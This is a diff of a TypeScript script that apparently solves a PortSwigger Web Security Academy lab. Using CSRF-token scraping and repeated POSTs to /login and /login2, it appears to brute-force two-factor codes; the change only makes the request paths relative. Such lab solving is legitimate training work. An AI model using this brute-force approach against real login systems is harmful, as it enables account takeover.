@@ -10,7 +10,7 @@ const LABID = "0a8d009003d9e47288fe1aa600a70075"
 const iter = async (mfa1: number, mfa2: number) => {
 	const sess = new Sess()
 	const csrf1 = await sess.req`
-		GET https://${LABID}.web-security-academy.net/login HTTP/1.1
+		GET /login HTTP/1.1
 		Upgrade-Insecure-Requests: 1
 		Sec-Fetch-Dest: document
 		Sec-Fetch-Mode: navigate
@@ -19,7 +19,7 @@ const iter = async (mfa1: number, mfa2: number) => {
 	`.then(r => r.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0])
 
 	await sess.req`
-		POST https://${LABID}.web-security-academy.net/login HTTP/1.1
+		POST /login HTTP/1.1
 		Content-Type: application/x-www-form-urlencoded
 		Content-Length: 70
 		Origin: https://${LABID}.web-security-academy.net
@@ -33,7 +33,7 @@ const iter = async (mfa1: number, mfa2: number) => {
 	`
 
 	const csrf2 = await sess.req`
-		GET https://${LABID}.web-security-academy.net/login2 HTTP/1.1
+		GET /login2 HTTP/1.1
 		Upgrade-Insecure-Requests: 1
 		Sec-Fetch-Dest: document
 		Sec-Fetch-Mode: navigate
@@ -42,7 +42,7 @@ const iter = async (mfa1: number, mfa2: number) => {
 	`.then(r => r.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0])
 
 	const r3 = await sess.req`
-		POST https://${LABID}.web-security-academy.net/login2 HTTP/1.1
+		POST /login2 HTTP/1.1
 		Content-Type: application/x-www-form-urlencoded
 		Content-Length: 51
 		Origin: https://${LABID}.web-security-academy.net
@@ -62,7 +62,7 @@ const iter = async (mfa1: number, mfa2: number) => {
 	}
 
 	const r4 = await sess.req`
-		POST https://${LABID}.web-security-academy.net/login2 HTTP/1.1
+		POST /login2 HTTP/1.1
 		Content-Type: application/x-www-form-urlencoded
 		Content-Length: 51
 		Origin: https://${LABID}.web-security-academy.net
